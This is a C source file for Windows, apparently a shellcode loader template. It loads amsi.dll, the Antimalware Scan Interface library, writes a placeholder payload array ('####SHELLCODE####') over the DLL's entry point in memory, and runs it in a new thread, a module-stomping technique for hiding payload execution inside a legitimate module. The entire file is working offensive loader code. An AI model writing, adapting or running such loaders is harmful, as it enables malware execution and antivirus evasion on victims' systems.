#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char *argv[])
{
    printf("Starting program...\n");

    // DWORD modulesSizeNeeded = 0;
    // SIZE_T modulesCount = 0;
    // CHAR remoteModuleName[128] = {};
    // HMODULE remoteModule = NULL;


    HMODULE hDll = LoadLibrary(TEXT("C:\\windows\\system32\\amsi.dll")); // Load a legitimate DLL
    if (hDll == NULL) {
        printf("Failed to load DLL. Error: %lu\n", GetLastError());
        return 1;
    }

    // Calculate the AddressOfEntryPoint
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hDll;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)hDll + dosHeader->e_lfanew);
    LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hDll);

    // Overwrite the AddressOfEntryPoint with magiccode
    SIZE_T bytesWritten;
    BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);
    if (!result) {
        printf("Failed to write magiccode. Error: %lu\n", GetLastError());
        FreeLibrary(hDll);
        return 1;
    }

    printf("[+] Code written. \n");

    // Create a thread to execute at the DLL's entry point
    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, &threadID);
    if (hThread == NULL) {
        printf("Failed to create a thread. Error: %lu\n", GetLastError());
        FreeLibrary(hDll);
        return 1;
    }

    if (WaitForSingleObject(hThread, 5000) == WAIT_TIMEOUT) { // Wait 5 seconds
        TerminateThread(hThread, 0); // Forcibly terminates the thread
        printf("[+] Thread was terminated.\n");
    }

    // Get the exit code of the thread.
    DWORD exitCode = 0;
    if (!GetExitCodeThread(hThread, &exitCode)) {
        printf("[-] GetExitCodeThread failed: %d\n", GetLastError());
    } else {
        printf("[+] Thread exited with code: %lu\n", exitCode);
    }
	
    CloseHandle(hThread);
    FreeLibrary(hDll);
    return 0;

}